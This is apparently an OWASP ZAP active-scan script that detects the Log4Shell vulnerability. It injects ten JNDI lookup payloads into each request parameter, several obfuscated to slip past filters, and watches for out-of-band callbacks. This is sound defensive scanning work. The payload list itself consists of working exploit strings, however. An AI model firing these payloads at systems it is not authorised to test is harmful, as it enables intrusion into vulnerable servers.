// Note that new active scripts will initially be disabled
// Right click the script in the Scripts tree and select "enable"  

var payload_templates = [
    '${jndi:ldap://DOMAIN/abc}',
    '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://DOMAIN}/abc}',
    '${${::-j}ndi:rmi://DOMAIN}/abc}',
    '${jndi:rmi://DOMAIN}}',
    '${${lower:jndi}:${lower:rmi}://DOMAIN}/abc}',
    '${${lower:${lower:jndi}}:${lower:rmi}://DOMAIN}/abc}',
    '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://DOMAIN}/abc}',
    '${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://DOMAIN/abc}',
    '${jndi:dns://DOMAIN/abc}',
    '${jndi:${lower:l}${lower:d}a${lower:p}://DOMAIN/abc}'
]


/**
 * Scans a "node", i.e. an individual entry in the Sites Tree.
 * The scanNode function will typically be called once for every page. 
 * 
 * @param as - the ActiveScan parent object that will do all the core interface tasks 
 *     (i.e.: sending and receiving messages, providing access to Strength and Threshold settings,
 *     raising alerts, etc.). This is an ScriptsActiveScanner object.
 * @param msg - the HTTP Message being scanned. This is an HttpMessage object.
 */
function scanNode(as, msg) {

}

/**
 * Scans a specific parameter in an HTTP message.
 * The scan function will typically be called for every parameter in every URL and Form for every page.
 * 
 * @param as - the ActiveScan parent object that will do all the core interface tasks 
 *     (i.e.: sending and receiving messages, providing access to Strength and Threshold settings,
 *     raising alerts, etc.). This is an ScriptsActiveScanner object.
 * @param msg - the HTTP Message being scanned. This is an HttpMessage object.
 * @param {string} param - the name of the parameter being manipulated for this test/scan.
 * @param {string} value - the original parameter value.
 */
function scan(as, msg, param, value) {

	// Debugging can be done using println like this
	print('scan called for url=' + msg.getRequestHeader().getURI().toString() + 
		' param=' + param + ' value=' + value);
	

	var Control = Java.type("org.parosproxy.paros.control.Control")
	var extOast = Control.getSingleton().getExtensionLoader().getExtension("ExtensionOast")

	for(var i in payload_templates){
		// Copy requests before reusing them
		msg = msg.cloneRequest();
		
		var alert= as.newAlert().setRisk(3)
			.setConfidence(3)
			.setName('Log4Jshell')
			.setDescription('Detect Log4Jshell')
			.setParam(param)
			.setAttack('Your attack')
			.setEvidence('OOB Lookup occur')
			.setOtherInfo('Any other info')
			.setSolution('The solution')
			.setReference('References')
			.setCweId(0)
			.setWascId(0)
			.setMessage(msg)
			.build()

		var domain_payload = extOast.registerAlertAndGetPayload(alert)	
		var payload = payload_templates[i].replace("DOMAIN",domain_payload)
		alert.setAttack(payload);

		// setParam (message, parameterName, newValue)
		as.setParam(msg, param, payload);
		// sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
		
		
		//raiseAlert(as, msg, param, payload, request.getSource())
		
		
		as.sendAndReceive(msg, false, false);

	}
	
}

